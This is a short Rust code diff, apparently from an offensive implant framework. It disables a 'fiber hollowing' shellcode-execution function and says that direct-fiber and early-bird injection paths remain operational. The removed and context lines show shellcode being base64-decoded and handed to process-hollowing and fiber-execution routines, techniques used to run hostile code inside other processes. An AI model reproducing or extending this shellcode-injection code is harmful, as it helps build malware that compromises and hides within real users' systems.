@@ -66,23 +66,20 @@ impl FiberExecutor {
         unsafe { self.execute_shellcode_with_fiber(&shellcode) }
     }
 
-    /// Execute shellcode using process hollowing with fibers
+    /// Process hollowing with fibers.
+    ///
+    /// **Deferred**: The fiber stub currently contains a placeholder loop and
+    /// lacks dynamic API resolution, so this path is not yet functional.
+    /// Callers should use `execute_direct_fiber` or `execute_early_bird_fiber`
+    /// instead -- both are operational.
     pub async fn execute_fiber_hollowing(
         &self,
-        shellcode_b64: &str,
-        target_process: &str,
+        _shellcode_b64: &str,
+        _target_process: &str,
     ) -> Result<String> {
-        let shellcode = general_purpose::STANDARD
-            .decode(shellcode_b64)
-            .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;
-
-        if shellcode.is_empty() {
-            return Err(NexusError::TaskExecutionError(
-                "Empty shellcode".to_string(),
-            ));
-        }
-
-        unsafe { self.execute_via_process_hollowing(&shellcode, target_process) }
+        Err(NexusError::TaskExecutionError(
+            "fiber hollowing not yet functional -- use direct fiber execution or early bird injection".to_string(),
+        ))
     }
 
     unsafe fn execute_shellcode_with_fiber(&self, shellcode: &[u8]) -> Result<String> {
